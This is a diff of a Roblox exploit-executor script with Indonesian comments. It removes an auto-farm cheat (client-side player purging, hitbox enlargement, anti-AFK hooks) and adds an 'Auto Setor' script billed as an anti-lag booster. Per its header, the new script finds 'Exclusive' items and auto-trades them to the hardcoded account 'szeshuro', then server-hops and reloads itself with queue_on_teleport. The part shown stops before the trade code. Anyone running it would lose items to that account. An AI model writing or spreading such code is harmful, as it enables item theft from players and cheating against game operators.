@@ -1,1093 +1,598 @@
 -- ==============================================================================
--- 🥔 KALB ULTRA LIGHTWEIGHT AUTO FARM V2 (METEOR SHOWER AUTO KICK & AUTO BUY)
+-- 🚀 AUTO SETOR EXCLUSIVE BRAINROT -> USERNAME: szeshuro + AUTO SERVER HOP
+-- ⚡ ULTRA ANTI-LAG & POTATO MODE (60+ FPS & ZERO FREEZE)
 -- ==============================================================================
--- Fitur & Alur:
--- 1. ⚙️ Full Config Mode: Semua pengaturan diatur via variabel _G di baris atas (Tanpa UI)
--- 2. 🚫 Total Player & Character Purger (100% Bersih):
---    - Menghapus & memusnahkan SEMUA player lain dari game.Players
---    - Menghapus SEMUA karakter player lain dari folder workspace.Players & workspace root
---    - Real-time listener + Background loop anti-bocor (tidak ada lagi yang lolos)
--- 3. ☄️ Meteor Shower Auto Kick: Bot menendang bola (nonstop / saat event)
--- 4. ☄️ Auto Meteor Event: Memperbesar hitbox meteor di Debris (200x200x200, CanQuery=true)
--- 5. 🛒 Auto Buy Frigorex & Tricerabob: Request stock tiap 5 menit & auto beli jika stock > 0
--- 6. 🧪 Auto Buy Farm Potion: Auto beli 1x setiap pergantian jam ganjil (1, 3, 5... 23 WIB)
--- 7. 💰 Auto Sell All: Menjual semua brainrot tiap 5 detik (ref_B_SellAll)
--- 8. 🥔 Potato Mode Ekstrem & 🛡️ Anti-AFK
+-- Alur Kerja:
+-- 1. 🥔 Aktifkan Ultra Anti-Lag (Matikan Shadow, Texture, Partikel, Efek Lighting & Potato Map).
+-- 2. 🔍 Pindai seluruh inventory (Backpack & Karakter) untuk item bertipe "Exclusive".
+-- 3. ❓ Cek ketersediaan item:
+--    - Jika TIDAK ADA item Exclusive -> Langsung Server Hop ke server publik lain.
+-- 4. 🎯 Cek keberadaan target (szeshuro) di server saat ini:
+--    - Jika target TIDAK ADA di server -> Langsung Server Hop mencari server lain.
+--    - Jika target ADA di server:
+--      a. Kirim trade request ke szeshuro.
+--      b. Masukkan semua item Exclusive (maksimal 10 item per kloter).
+--      c. Tunggu countdown & auto confirm trade (Fase 1 & Fase 2).
+--      d. Ulangi kloter berikutnya hingga SEMUA item Exclusive di inventory habis (0).
+-- 5. 🌐 Setelah semua item Exclusive selesai disetor:
+--    - Otomatis Server Hop ke server publik lain untuk mencari stok/server berikutnya!
 -- ==============================================================================
 
 if not game:IsLoaded() then game.Loaded:Wait() end
 
 -- ==============================================================================
--- ⚙️ KONFIGURASI PENGGUNA (UBAH SESUAI KEBUTUHAN DI SINI)
+-- ⚙️ KONFIGURASI PENGGUNA
 -- ==============================================================================
-_G.autoFarm = true               -- true: Auto Farm Aktif, false: Nonaktif
-_G.onlyMeteorEvent = false        -- true: HANYA Auto Kick saat Event Meteor Shower aktif, false: Auto kick nonstop
-_G.autoMeteor = true             -- true: Otomatis perbesar hitbox meteor saat Meteor Shower, false: Nonaktif
-_G.autoBuyPatagotitan = true      -- true: Auto beli Patagotitan saat ready di Meteor Shop
-_G.autoBuySpeed = true            -- true: Auto beli Speed (+1) saat ready di Meteor Shop
-_G.autoBuyFrigorex = true        -- true: Auto beli Frigorex jika stock > 0
-_G.autoBuyTricerabob = true      -- true: Auto beli Tricerabob jika stock > 0
-_G.autoBuyFarmPotion = true      -- true: Auto beli 1x Farm Potion khusus jam ganjil (1, 3, 5... 23 WIB) maksimal menit :10
-_G.autoSellAll = false            -- true: Auto Sell All setiap 5 detik via ref_B_SellAll
-_G.autoRemovePlayer = true       -- true: Hapus player lain dari game.Players & workspace.Players (100% Bersih & No Lag), false: Biarkan
-_G.debugConsoleLog = false        -- true: Cetak log status/fase ke console (F9), false: Senyap
-_G.failsafeTimeout = 25          -- Waktu maksimal (detik) sebelum auto-reset ke Safe Zone jika macet
+local TARGET_USERNAME = "szeshuro"      -- Username tujuan setor
+local TARGET_RARITY = "Exclusive"       -- Rarity yang disetor
+local INSERT_DELAY = 0.25               -- Jeda input item ke trade slot (detik)
+local TRADE_TIMEOUT = 20                -- Batas waktu menunggu target merespon trade (detik)
+local AUTO_UNFAVORITE = true            -- Otomatis unfavorite item jika terkunci favorite
+local AUTO_REQUEUE_ON_HOP = true        -- Otomatis jalankan script kembali setelah teleport ke server baru
 
-print("--------------------------------------------------")
-print("🚀 [INIT] Memuat KALB Auto Farm V2 (Ultra Lightweight & Total Player Purger)...")
+-- 🥔 Pengaturan Anti-Lag
+local ENABLE_ANTI_LAG = true            -- Aktifkan sistem anti-lag & FPS booster
+local POTATO_WHITE_MAP = true           -- Ubah map menjadi putih & material plastic ringan
+local DISABLE_SHADOWS = true            -- Matikan bayangan global
+local REMOVE_PARTICLES = true           -- Hapus partikel, api, asap, dan efek berat
 
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local RunService = game:GetService("RunService")
+local TeleportService = game:GetService("TeleportService")
+local HttpService = game:GetService("HttpService")
+local StarterGui = game:GetService("StarterGui")
 local Lighting = game:GetService("Lighting")
-local VirtualUser = game:GetService("VirtualUser")
+local LocalPlayer = Players.LocalPlayer
 
-local lp = Players.LocalPlayer
-if not lp then
-    local count = 0
-    repeat
-        task.wait(0.05)
-        lp = Players.LocalPlayer
-        count = count + 1
-    until lp or count > 50
+while not LocalPlayer do
+    task.wait(0.1)
+    LocalPlayer = Players.LocalPlayer
 end
 
-local lpName = lp and lp.Name or ""
-local lpDisplayName = lp and lp.DisplayName or ""
-local myUidStr = lp and tostring(lp.UserId) or ""
-
--- =============================================
--- 🚀 SYSTEM ANTI-LAG & POTATO MODE
--- =============================================
-local function stripTexture(v)
-    if not v then return end
-    if lp and lp.Character and (v == lp.Character or v:IsDescendantOf(lp.Character)) then return end
-
+-- ==============================================================================
+-- 🥔 1. ULTRA ANTI-LAG & POTATO MODE ENGINE (SUPER SMOOTH)
+-- ==============================================================================
+if ENABLE_ANTI_LAG then
     pcall(function()
-        if v:IsA("BasePart") then
-            v.Material = Enum.Material.Plastic
-            v.Reflectance = 0
-            v.CastShadow = false
-            v.Color = Color3.new(1, 1, 1)
-            if v:IsA("MeshPart") then
-                v.TextureID = ""
+        -- Setting Hardware / Rendering Level 1
+        if settings and settings().Rendering then
+            settings().Rendering.QualityLevel = 1
+        end
+
+        -- Lighting Optimization
+        if DISABLE_SHADOWS then
+            Lighting.GlobalShadows = false
+            Lighting.FogEnd = 9e9
+            Lighting.Brightness = 1
+        end
+
+        -- Hapus Efek Berat di Lighting
+        for _, effect in ipairs(Lighting:GetChildren()) do
+            if effect:IsA("PostEffect") or effect:IsA("BloomEffect") or effect:IsA("BlurEffect") or effect:IsA("ColorCorrectionEffect") or effect:IsA("SunRaysEffect") or effect:IsA("DepthOfFieldEffect") or effect:IsA("Atmosphere") then
+                effect.Enabled = false
+                effect:Destroy()
             end
-        elseif v:IsA("SpecialMesh") then
-            v.TextureId = ""
-        elseif v:IsA("Decal") or v:IsA("Texture") or v:IsA("ParticleEmitter") or v:IsA("Trail") or v:IsA("Beam") or v:IsA("Fire") or v:IsA("Smoke") or v:IsA("Sparkles") or v:IsA("SurfaceAppearance") or v:IsA("Clothing") or v:IsA("ShirtGraphic") then
-            v:Destroy()
+        end
+
+        -- Terrain Optimization
+        local terrain = workspace:FindFirstChildOfClass("Terrain")
+        if terrain then
+            terrain.WaterWaveSize = 0
+            terrain.WaterWaveSpeed = 0
+            terrain.WaterReflectance = 0
+            terrain.WaterTransparency = 0
+            if sethiddenproperty then
+                pcall(function() sethiddenproperty(terrain, "Decoration", false) end)
+            end
         end
     end)
-end
 
-pcall(function()
-    for _, v in ipairs(workspace:GetDescendants()) do
-        stripTexture(v)
-    end
+    local PURGE_CLASSES = {
+        PointLight = true,
+        SpotLight = true,
+        SurfaceLight = true,
+        ParticleEmitter = true,
+        Trail = true,
+        Beam = true,
+        Fire = true,
+        Smoke = true,
+        Sparkles = true,
+        SurfaceAppearance = true,
+        Highlight = true,
+    }
 
-    Lighting.GlobalShadows = false
-    Lighting.FogEnd = 9e9
-    for _, v in ipairs(Lighting:GetDescendants()) do
-        if v:IsA("PostEffect") or v:IsA("BlurEffect") or v:IsA("SunRaysEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("BloomEffect") or v:IsA("DepthOfFieldEffect") or v:IsA("Sky") then
-            v:Destroy()
-        end
-    end
-end)
+    local function optimizeInstance(v)
+        if not v then return end
+        -- Jangan ganggu karakter pemain sendiri atau target szeshuro
+        if LocalPlayer.Character and (v == LocalPlayer.Character or v:IsDescendantOf(LocalPlayer.Character)) then return end
+        local targetObj = Players:FindFirstChild(TARGET_USERNAME)
+        if targetObj and targetObj.Character and (v == targetObj.Character or v:IsDescendantOf(targetObj.Character)) then return end
 
--- =============================================
--- 🚫 TOTAL PLAYER & CHARACTER PURGER (100% BERSIH)
--- =============================================
-local function isLocalPlayerEntity(inst)
-    if not inst then return false end
-    if lp and inst == lp then return true end
-    if lp and lp.Character and (inst == lp.Character or inst:IsDescendantOf(lp.Character)) then return true end
-    local name = inst.Name
-    if name == lpName or (lpDisplayName ~= "" and name == lpDisplayName) then return true end
-    return false
-end
+        pcall(function()
+            local className = v.ClassName
 
-local function purgeOtherPlayer(player)
-    if not _G.autoRemovePlayer or not player or player == lp or player.Name == lpName then return end
-    
-    pcall(function()
-        if player.Character then
-            player.Character:ClearAllChildren()
-            player.Character:Destroy()
-        end
-    end)
-    pcall(function()
-        player:ClearAllChildren()
-        player:Destroy()
-    end)
-end
-
-local function purgeOtherCharacter(charModel)
-    if not _G.autoRemovePlayer or not charModel then return end
-    if isLocalPlayerEntity(charModel) then return end
-    if charModel.Name == "Plots" or charModel.Name == "Debris" or charModel.Name == "NPCs" then return end
-
-    pcall(function()
-        for _, v in ipairs(charModel:GetDescendants()) do
-            if v:IsA("BasePart") then
-                v.Transparency = 1
-                v.CanCollide = false
-                v.CanTouch = false
-                v.CanQuery = false
-            elseif v:IsA("Decal") or v:IsA("Texture") or v:IsA("BillboardGui") or v:IsA("SurfaceGui") or v:IsA("Highlight") then
-                v.Enabled = false
+            -- Hapus partikel dan efek cahaya berat
+            if REMOVE_PARTICLES and PURGE_CLASSES[className] then
                 v:Destroy()
+                return
             end
+
+            -- Hilangkan Decal & Tekstur jika Potato Mode aktif
+            if POTATO_WHITE_MAP then
+                if className == "Decal" or className == "Texture" or v:IsA("Decal") or v:IsA("Texture") then
+                    v.Transparency = 1
+                    return
+                end
+
+                if v:IsA("BasePart") then
+                    v.Material = Enum.Material.Plastic
+                    v.Reflectance = 0
+                    v.CastShadow = false
+                    v.Color = Color3.new(1, 1, 1) -- Potato White Map
+                    if v:IsA("MeshPart") then
+                        v.TextureID = ""
+                    end
+                elseif v:IsA("SpecialMesh") then
+                    v.TextureId = ""
+                end
+            end
+        end)
+    end
+
+    -- Sapu objek awal di workspace
+    task.spawn(function()
+        for _, v in ipairs(workspace:GetDescendants()) do
+            optimizeInstance(v)
         end
-        charModel:ClearAllChildren()
-        charModel:Destroy()
+    end)
+
+    -- Listener real-time untuk objek baru yang spawn
+    workspace.DescendantAdded:Connect(function(v)
+        task.defer(optimizeInstance, v)
+    end)
+
+    print("[⚡ Anti-Lag] Sistem Anti-Lag & Potato Mode Aktif!")
+end
+
+-- ==============================================================================
+-- 🛡️ 2. ANTI-AFK SYSTEM (Mencegah Kick 20 Menit)
+-- ==============================================================================
+pcall(function()
+    LocalPlayer.Idled:Connect(function()
+        local char = LocalPlayer.Character
+        local hum = char and char:FindFirstChildOfClass("Humanoid")
+        if hum and hum.Health > 0 then
+            hum:ChangeState(Enum.HumanoidStateType.Jumping)
+        end
+    end)
+end)
+
+-- ==============================================================================
+-- 📢 3. NOTIFIKASI & LOGGING
+-- ==============================================================================
+local function notify(title, text, duration)
+    pcall(function()
+        StarterGui:SetCore("SendNotification", {
+            Title = title or "Auto Setor",
+            Text = text or "",
+            Duration = duration or 4
+        })
     end)
 end
 
-local function scanAndPurgeAllOtherPlayers()
-    if not _G.autoRemovePlayer then return end
+local function log(...)
+    print("[📦 Auto Setor]", ...)
+end
 
-    -- 1. Bersihkan dari game:GetService("Players")
-    for _, p in ipairs(Players:GetPlayers()) do
-        if p ~= lp then
-            purgeOtherPlayer(p)
-        end
-    end
-    for _, child in ipairs(Players:GetChildren()) do
-        if child ~= lp and child:IsA("Player") then
-            purgeOtherPlayer(child)
-        end
-    end
+log("==================================================")
+log("🚀 Script Auto Setor Dimulai! Target: " .. TARGET_USERNAME)
+log("⚡ Anti-Lag & Booster: AKTIF")
+log("==================================================")
 
-    -- 2. Bersihkan dari workspace.Players folder
-    local wsPlayers = workspace:FindFirstChild("Players")
-    if wsPlayers then
-        for _, child in ipairs(wsPlayers:GetChildren()) do
-            if child.Name ~= "Plots" and not isLocalPlayerEntity(child) then
-                purgeOtherCharacter(child)
-            end
-        end
-    end
+-- ==============================================================================
+-- 📡 4. INISIALISASI NETWORK REMOTES
+-- ==============================================================================
+local networkFolder = nil
+pcall(function()
+    local shared = ReplicatedStorage:WaitForChild("Shared", 5)
+    local packages = shared and shared:WaitForChild("Packages", 5)
+    networkFolder = packages and packages:WaitForChild("Network", 5)
+end)
 
-    -- 3. Bersihkan dari workspace root (karakter liar)
-    for _, child in ipairs(workspace:GetChildren()) do
-        if child:IsA("Model") and not isLocalPlayerEntity(child) and child.Name ~= "Plots" and child.Name ~= "Debris" and child.Name ~= "NPCs" and child.Name ~= "Players" then
-            if child:FindFirstChildOfClass("Humanoid") or child:FindFirstChild("HumanoidRootPart") or child:FindFirstChild("Head") then
-                purgeOtherCharacter(child)
-            end
-        end
+local ref_trade_r = networkFolder and networkFolder:FindFirstChild("ref_trade_r")
+local rev_trade_i = networkFolder and networkFolder:FindFirstChild("rev_trade_i")
+local rev_trade_start = networkFolder and networkFolder:FindFirstChild("rev_trade_start")
+local rev_ToggleFav = networkFolder and networkFolder:FindFirstChild("rev_ToggleFav")
+
+-- Fallback pencarian remote jika folder network berubah
+if not ref_trade_r or not rev_trade_i then
+    for _, desc in ipairs(ReplicatedStorage:GetDescendants()) do
+        if desc.Name == "ref_trade_r" and desc:IsA("RemoteFunction") then ref_trade_r = desc end
+        if desc.Name == "rev_trade_i" and desc:IsA("RemoteEvent") then rev_trade_i = desc end
+        if desc.Name == "rev_trade_start" and desc:IsA("RemoteEvent") then rev_trade_start = desc end
+        if desc.Name == "rev_ToggleFav" and desc:IsA("RemoteEvent") then rev_ToggleFav = desc end
     end
 end
 
--- Eksekusi awal pembersihan player & karakter
-scanAndPurgeAllOtherPlayers()
-
--- Event Listener saat ada Player baru join
-Players.PlayerAdded:Connect(function(player)
-    if not _G.autoRemovePlayer then return end
-    if player ~= lp then
-        task.defer(function()
-            purgeOtherPlayer(player)
-        end)
-        player.CharacterAdded:Connect(function(char)
-            task.defer(function()
-                purgeOtherCharacter(char)
-            end)
-        end)
+-- ==============================================================================
+-- 📚 5. DATABASE & ENTITIES DATA SCANNER
+-- ==============================================================================
+local EntitiesDataModule = nil
+pcall(function()
+    local shared = ReplicatedStorage:FindFirstChild("Shared")
+    local dataFolder = shared and shared:FindFirstChild("Data")
+    local entitiesObj = dataFolder and dataFolder:FindFirstChild("EntitiesData")
+    if entitiesObj then
+        EntitiesDataModule = require(entitiesObj)
     end
 end)
 
-Players.ChildAdded:Connect(function(child)
-    if not _G.autoRemovePlayer then return end
-    if child ~= lp and child:IsA("Player") then
-        task.defer(function()
-            purgeOtherPlayer(child)
-        end)
-    end
-end)
-
--- Listener khusus untuk workspace.Players
-local function setupWsPlayersListener(folder)
-    if not folder then return end
-    for _, child in ipairs(folder:GetChildren()) do
-        if child.Name ~= "Plots" and not isLocalPlayerEntity(child) then
-            purgeOtherCharacter(child)
-        end
-    end
-    folder.ChildAdded:Connect(function(child)
-        if not _G.autoRemovePlayer then return end
-        task.defer(function()
-            if child.Name ~= "Plots" and not isLocalPlayerEntity(child) then
-                purgeOtherCharacter(child)
-            end
-        end)
-    end)
+local function getToolGUID(tool)
+    if not tool then return nil end
+    return tool:GetAttribute("guid") or tool:GetAttribute("GUID") or tool:GetAttribute("uid")
 end
 
-local wsPlayers = workspace:FindFirstChild("Players")
-if wsPlayers then
-    setupWsPlayersListener(wsPlayers)
+local function isToolFavorite(tool)
+    if not tool then return false end
+    local isFav = tool:GetAttribute("Favorite") or tool:GetAttribute("favorite") or tool:GetAttribute("Fav") or tool:GetAttribute("isFav")
+    if isFav ~= nil then return isFav == true end
+    local favObj = tool:FindFirstChild("Favorite") or tool:FindFirstChild("favorite") or tool:FindFirstChild("Fav")
+    if favObj and favObj:IsA("BoolValue") then return favObj.Value end
+    return false
 end
 
-workspace.ChildAdded:Connect(function(child)
-    if child.Name == "Players" then
-        task.defer(function() setupWsPlayersListener(child) end)
-    elseif child:IsA("Model") and not isLocalPlayerEntity(child) and child.Name ~= "Plots" and child.Name ~= "Debris" and child.Name ~= "NPCs" then
-        task.defer(function()
-            if child:FindFirstChildOfClass("Humanoid") or child:FindFirstChild("HumanoidRootPart") or child:FindFirstChild("Head") then
-                purgeOtherCharacter(child)
-            end
-        end)
-    end
-end)
+local function getToolRarity(tool)
+    if not tool then return "Unknown" end
+    local baseName = tool.Name
 
--- Background Sweeper Loop (Menjamin 0% Player Lolos & Bersihkan RAM)
-task.spawn(function()
-    local cleanCounter = 0
-    while task.wait(0.25) do
-        if _G.autoRemovePlayer then
-            pcall(scanAndPurgeAllOtherPlayers)
+    -- 1. Cek EntitiesData runtime
+    if EntitiesDataModule then
+        if EntitiesDataModule.Brainrots and EntitiesDataModule.Brainrots[baseName] then
+            local r = EntitiesDataModule.Brainrots[baseName].Rarity
+            if r and r ~= "" then return r end
         end
-
-        cleanCounter = cleanCounter + 1
-        -- Tiap 30 detik jalankan garbage collector
-        if cleanCounter >= 120 then
-            cleanCounter = 0
-            pcall(function()
-                if gcinfo then gcinfo() end
-                if collectgarbage then collectgarbage("collect") end
-            end)
-        end
-    end
-end)
-
--- =============================================
--- 🎯 DETEKTOR PLOT SENDIRI & REMOVER PLOT LAIN
--- =============================================
-local function isMyPlot(plotModel)
-    if not plotModel or not plotModel:IsA("Model") then return false end
-
-    local sign = plotModel:FindFirstChild("PlotSign", true)
-    if sign then
-        local pps = sign:FindFirstChild("PlayerPlotSign", true)
-        if pps then
-            local nameLabel = pps:FindFirstChild("PlayerName", true)
-            if nameLabel and nameLabel:IsA("TextLabel") then
-                local t = nameLabel.Text
-                if t and (t == lpName or t:find(lpName, 1, true) or (lpDisplayName ~= "" and (t == lpDisplayName or t:find(lpDisplayName, 1, true)))) then
-                    return true
-                end
-            end
-            local icon = pps:FindFirstChild("PlayerIcon", true)
-            if icon and (icon:IsA("ImageLabel") or icon:IsA("ImageButton")) then
-                local img = icon.Image
-                if img and img:find(myUidStr, 1, true) then
-                    return true
-                end
-            end
+        if EntitiesDataModule.LuckyBlocks and EntitiesDataModule.LuckyBlocks[baseName] then
+            local r = EntitiesDataModule.LuckyBlocks[baseName].Rarity
+            if r and r ~= "" then return r end
         end
     end
 
-    for _, item in ipairs(plotModel:GetDescendants()) do
-        local ok, result = pcall(function()
-            if item:IsA("TextLabel") then
-                local t = item.Text
-                if t and (t == lpName or (lpDisplayName ~= "" and t == lpDisplayName)) then
-                    return true
-                end
-            elseif item:IsA("StringValue") or item:IsA("ObjectValue") or item:IsA("IntValue") or item:IsA("NumberValue") then
-                local v = item.Value
-                if v == lpName or v == lp or tostring(v) == myUidStr then
-                    return true
-                end
-            end
-            return false
-        end)
-        if ok and result then return true end
+    -- 2. Cek Attribute pada Tool
+    local attrRarity = tool:GetAttribute("Rarity") or tool:GetAttribute("rarity") or tool:GetAttribute("RarityName")
+    if attrRarity and tostring(attrRarity) ~= "" then
+        return tostring(attrRarity)
+    end
+
+    -- 3. Cek Child Value pada Tool
+    local rarityObj = tool:FindFirstChild("Rarity") or tool:FindFirstChild("rarity")
+    if rarityObj and rarityObj:IsA("StringValue") and rarityObj.Value ~= "" then
+        return rarityObj.Value
+    end
+
+    return "Unknown"
+end
+
+local function isTargetExclusiveTool(tool)
+    if not tool or not tool:IsA("Tool") then return false end
+    local guid = getToolGUID(tool)
+    if not guid then return false end
+
+    local rarity = getToolRarity(tool)
+    if string.lower(rarity) == string.lower(TARGET_RARITY) then
+        return true
+    end
+
+    -- Khusus item Lucky Block / Item Exclusive bawaan
+    local lowerName = string.lower(tool.Name)
+    if lowerName == "virus" or lowerName == "block cup" or lowerName == "volcanic" or lowerName == "weather" or lowerName == "rainbow" or lowerName == "eternal" then
+        return true
     end
 
     return false
 end
 
-local function cleanPlots(plotsFolder)
-    if not plotsFolder then return end
-    for _, plot in ipairs(plotsFolder:GetChildren()) do
-        if plot:IsA("Model") and not isMyPlot(plot) then
-            pcall(function() plot:Destroy() end)
-        end
-    end
-    plotsFolder.ChildAdded:Connect(function(plot)
-        task.wait(0.2)
-        if plot:IsA("Model") and not isMyPlot(plot) then
-            pcall(function() plot:Destroy() end)
-        end
-    end)
-end
+local function getExclusiveToolsInInventory()
+    local exclusiveList = {}
+    local backpack = LocalPlayer:FindFirstChild("Backpack")
+    local char = LocalPlayer.Character
 
-local plotsFolder = workspace:FindFirstChild("Plots") or (workspace:FindFirstChild("Players") and workspace.Players:FindFirstChild("Plots"))
-if plotsFolder then
-    cleanPlots(plotsFolder)
-end
-
--- =============================================
--- ☄️ AUTO METEOR EVENT ENGINE (HITBOX EXPANDER)
--- =============================================
-local OPTIMAL_METEOR_SIZE = Vector3.new(200, 200, 200)
-local activeMeteors = {}
-local isMeteorShowerActive = false
-
-local function isTargetMeteorModel(model)
-    if not model or not model:IsA("Model") then return false end
-    local debris = workspace:FindFirstChild("Debris")
-    if not debris or not model:IsDescendantOf(debris) then return false end
-    return tonumber(model.Name) ~= nil
-end
-
-local function getTargetMeteorParent(instance)
-    if not instance then return nil end
-    local debris = workspace:FindFirstChild("Debris")
-    if not debris or not instance:IsDescendantOf(debris) then return nil end
-
-    local curr = instance
-    while curr and curr ~= debris and curr ~= workspace do
-        if curr:IsA("Model") and tonumber(curr.Name) ~= nil then
-            return curr
-        end
-        curr = curr.Parent
-    end
-    return nil
-end
-
-local function expandMeteorHitbox(part)
-    if not part or not (part:IsA("BasePart") or part.ClassName == "Part") then return end
-    pcall(function()
-        part.CanCollide = false
-        part.CanTouch = true
-        part.CanQuery = true
-        part.CastShadow = false
-        if part.Size ~= OPTIMAL_METEOR_SIZE then
-            part.Size = OPTIMAL_METEOR_SIZE
-        end
-    end)
-end
-
-local function handleNewMeteor(model)
-    if not _G.autoMeteor then return end
-    if not model or not isTargetMeteorModel(model) then return end
-    if activeMeteors[model] then return end
-    activeMeteors[model] = true
-    isMeteorShowerActive = true
-
-    for _, descendant in ipairs(model:GetDescendants()) do
-        if descendant:IsA("BasePart") or descendant.ClassName == "Part" then
-            expandMeteorHitbox(descendant)
-        end
-    end
-
-    if _G.debugConsoleLog then
-        print(string.format("☄️ [METEOR] Hitbox Model #%s diperbesar (200 studs, CanQuery=true)!", tostring(model.Name)))
-    end
-end
-
-local function setupMeteorListeners(debris)
-    if not debris then return end
-
-    for _, item in ipairs(debris:GetDescendants()) do
-        if isTargetMeteorModel(item) then
-            handleNewMeteor(item)
-        end
-    end
-
-    debris.DescendantAdded:Connect(function(descendant)
-        task.defer(function()
-            if not _G.autoMeteor then return end
-            if isTargetMeteorModel(descendant) then
-                handleNewMeteor(descendant)
-            elseif descendant:IsA("BasePart") or descendant.ClassName == "Part" then
-                local targetModel = getTargetMeteorParent(descendant)
-                if targetModel then
-                    expandMeteorHitbox(descendant)
-                    handleNewMeteor(targetModel)
-                end
+    if backpack then
+        for _, t in ipairs(backpack:GetChildren()) do
+            if isTargetExclusiveTool(t) then
+                table.insert(exclusiveList, t)
             end
-        end)
-    end)
+        end
+    end
 
-    debris.DescendantRemoving:Connect(function(descendant)
-        activeMeteors[descendant] = nil
+    if char then
+        for _, t in ipairs(char:GetChildren()) do
+            if isTargetExclusiveTool(t) then
+                table.insert(exclusiveList, t)
+            end
+        end
+    end
+
+    return exclusiveList
+end
+
+-- ==============================================================================
+-- 🌐 6. PUBLIC SERVER HOPPING SYSTEM
+-- ==============================================================================
+local function queueScriptExecution()
+    if not AUTO_REQUEUE_ON_HOP then return end
+    pcall(function()
+        local scriptSource = ""
+        if readfile and isfile and isfile("auto setor.lua") then
+            scriptSource = readfile("auto setor.lua")
+        elseif readfile and isfile and isfile("Untuk Auto Trade/auto setor.lua") then
+            scriptSource = readfile("Untuk Auto Trade/auto setor.lua")
+        end
+
+        if scriptSource ~= "" then
+            if queue_on_teleport then
+                queue_on_teleport(scriptSource)
+            elseif syn and syn.queue_on_teleport then
+                syn.queue_on_teleport(scriptSource)
+            elseif fluxus and fluxus.queue_on_teleport then
+                fluxus.queue_on_teleport(scriptSource)
+            end
+        end
     end)
 end
 
-task.spawn(function()
-    local debris = workspace:FindFirstChild("Debris") or workspace:WaitForChild("Debris", 10)
-    if debris then setupMeteorListeners(debris) end
-end)
+local function serverHop()
+    log("🌐 Memulai pencarian Server Publik lain...")
+    notify("🌐 Server Hop", "Mencari server publik baru...", 4)
+    queueScriptExecution()
 
-workspace.ChildAdded:Connect(function(child)
-    if child.Name == "Debris" then
-        task.defer(function() setupMeteorListeners(child) end)
-    end
-end)
+    task.spawn(function()
+        local placeId = game.PlaceId
+        local currentJobId = game.JobId
+        local candidateServers = {}
 
-task.spawn(function()
-    while task.wait(0.25) do
-        if not _G.autoMeteor then continue end
-        local debris = workspace:FindFirstChild("Debris")
-        if debris then
-            for _, item in ipairs(debris:GetDescendants()) do
-                if isTargetMeteorModel(item) then
-                    if not activeMeteors[item] then handleNewMeteor(item) end
-                    for _, part in ipairs(item:GetDescendants()) do
-                        if (part:IsA("BasePart") or part.ClassName == "Part") and (part.Size ~= OPTIMAL_METEOR_SIZE or not part.CanQuery) then
-                            expandMeteorHitbox(part)
+        -- Query server publik Roblox API
+        local success, response = pcall(function()
+            local url = "https://games.roblox.com/v1/games/" .. tostring(placeId) .. "/servers/Public?sortOrder=Asc&limit=100"
+            return game:HttpGet(url)
+        end)
+
+        if success and response then
+            local decoded = nil
+            pcall(function() decoded = HttpService:JSONDecode(response) end)
+
+            if decoded and decoded.data then
+                for _, s in ipairs(decoded.data) do
+                    if type(s) == "table" and s.id and s.playing and s.maxPlayers then
+                        if s.id ~= currentJobId and s.playing < s.maxPlayers and s.playing > 0 then
+                            table.insert(candidateServers, s)
                         end
                     end
                 end
             end
         end
-    end
-end)
 
--- =============================================
--- 🧠 VARIABEL STATE MACHINE & POSISI
--- =============================================
-local targetAction = "Idle"
-local lastAction = "Idle"
-local stateTimer = 0               
-local globalStuckTimer = 0         
-local mutationCount = 0            
-local lastRewardDesc = "None"
-local kickRetryCount = 0
-local MAX_KICK_RETRIES = 2
-local kickAcceptedByServer = false
-local safeZone = Vector3.new(698.030701, 3.298559, 233.707077)
-local safeZoneCFrame = CFrame.new(698.030701, 3.298559, 233.707077, -0.061024, -0.000000, 0.998136, -0.000000, 1.000000, 0.000000, -0.998136, -0.000000, -0.061024)
-
-local function logConsole(msg)
-    if _G.debugConsoleLog then
-        print(string.format("🤖 [KALB-FARM] [%s] %s", tostring(targetAction), tostring(msg)))
-    end
-end
-
-local function checkMeteorShowerActive()
-    if isMeteorShowerActive then return true end
-    local debris = workspace:FindFirstChild("Debris")
-    if debris then
-        for _, child in ipairs(debris:GetChildren()) do
-            if child:IsA("Model") and tonumber(child.Name) ~= nil then
-                isMeteorShowerActive = true
-                return true
-            end
-        end
-    end
-    return false
-end
-
-local function shouldKick()
-    if not _G.autoFarm then return false end
-    if _G.onlyMeteorEvent then
-        return checkMeteorShowerActive()
-    end
-    return true
-end
-
--- =============================================
--- 🛡️ ANTI AFK (MURNI TANPA KLIK APAPUN)
--- =============================================
-pcall(function()
-    if getconnections then
-        for _, conn in ipairs(getconnections(lp.Idled)) do
-            conn:Disable()
-        end
-    end
-end)
-
-lp.Idled:Connect(function()
-    pcall(function()
-        if getconnections then
-            for _, conn in ipairs(getconnections(lp.Idled)) do
-                conn:Disable()
-            end
-        end
-        if VirtualUser then
-            VirtualUser:CaptureController()
-            VirtualUser:ClickButton2(Vector2.new())
-        end
-    end)
-end)
-
--- =============================================
--- 📡 DAFTAR REMOTE NETWORK RESMI & AUTO-RESOLVER
--- =============================================
-local networkFolder = nil
-pcall(function()
-    local shared = ReplicatedStorage:FindFirstChild("Shared") or ReplicatedStorage:WaitForChild("Shared", 3)
-    local packages = shared and (shared:FindFirstChild("Packages") or shared:WaitForChild("Packages", 3))
-    networkFolder = packages and (packages:FindFirstChild("Network") or packages:WaitForChild("Network", 3))
-end)
-
-local function findRemote(name, className)
-    if networkFolder then
-        local r = networkFolder:FindFirstChild(name)
-        if r and (not className or r:IsA(className)) then return r end
-    end
-    for _, r in ipairs(ReplicatedStorage:GetDescendants()) do
-        if r.Name == name and (not className or r:IsA(className)) then
-            return r
-        end
-    end
-    return nil
-end
-
-local ref_KickEvent = findRemote("ref_KickEvent", "RemoteFunction")
-local kickRemote = findRemote("rev_KickEvent", "RemoteEvent")
-local rev_kickPhase2 = findRemote("rev_kickPhase2", "RemoteEvent")
-local rev_Collected = findRemote("rev_Collected", "RemoteEvent")
-local rev_KickEventEnded = findRemote("rev_KickEventEnded", "RemoteEvent")
-local rev_AddedWeather = findRemote("rev_AddedWeather", "RemoteEvent")
-local rev_RemovedWeather = findRemote("rev_RemovedWeather", "RemoteEvent")
-
-local ref_B_SellAll = findRemote("ref_B_SellAll", "RemoteFunction")
-local rev_MeteorShop_RequestSync = findRemote("rev_MeteorShop_RequestSync", "RemoteEvent")
-local rev_MeteorShop_Stock = findRemote("rev_MeteorShop_Stock", "RemoteEvent")
